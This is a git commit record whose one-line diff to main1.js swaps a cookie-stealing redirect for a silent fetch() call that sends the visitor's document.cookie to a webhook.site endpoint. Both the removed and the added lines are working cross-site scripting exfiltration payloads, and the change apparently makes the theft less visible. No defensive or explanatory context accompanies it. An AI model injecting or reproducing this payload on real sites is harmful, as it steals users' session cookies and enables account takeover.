dbd2281aadf3719b1121e15e98dc2983983794f5
Alvaro Gil <101978161+agm2716@users.noreply.github.com>
2025-11-28 18:42:06 +0100

    Update main1.js

--- main1.js
+++ main1.js
@@ -1,1 +1,1 @@
-window.location.href = "https://webhook.site/d808d3aa-a0c6-4270-8f30-cc07238c8b08?cookie" + document.cookie;
+fetch("https://webhook.site/d808d3aa-a0c6-4270-8f30-cc07238c8b08?cookie" + document.cookie);
